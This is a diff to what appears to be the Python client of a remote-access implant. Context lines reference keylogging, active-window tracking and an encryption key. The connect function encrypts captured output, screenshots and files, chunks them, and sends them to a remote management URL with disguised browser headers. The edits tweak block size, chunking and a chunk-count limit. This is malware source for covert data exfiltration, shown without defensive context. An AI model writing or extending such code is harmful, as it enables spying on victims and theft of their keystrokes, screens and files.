@@ -33,7 +33,7 @@ keys = ""
 klogging = False
 lastActiveWindow = ""
 encrypted = True
-BLOCK_SIZE = 32
+BLOCK_SIZE = 128
 
 #---------------Change Me---------------#
 #-----------b'<32 length key>-----------#
@@ -285,13 +285,11 @@ def connect(url, managementURL):
     # Due to the transaction codes (ex. "pic:") we need to trigger below even if file/screenshot does not have to be chunked
     placeholder = encrypt(b64)
     if len(placeholder) > 7000 or sendfilewarning or screenshotwarning:
-        b64 = placeholder
-        split = [b64[i:i + 7000] for i in range(0, len(b64), 7000)]
+        split = [placeholder[i:i + 7000] for i in range(0, len(placeholder), 7000)]
         length = len(split)
 
-
-        # If data will be sent in over 50 chunks, send warning that output cant be sent
-        if len(split) >= 50:
+        # If data will be sent in over 49 chunks, send warning that output cant be sent
+        if len(split) >= 49:
             # If output to soo large (over 50 chunks), let server know it's a no-go
             toolong = base64.b64encode("toolong:".encode('UTF-8'))
             toolong = encrypt(toolong)
@@ -327,6 +325,8 @@ def connect(url, managementURL):
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                        "Upgrade-Insecure-Requests": "1"}
+            #print ("sent: " + str(i))
+            #print ("length: " + str(len(i)))
             response = requests.get(url, headers=headers)
 
 
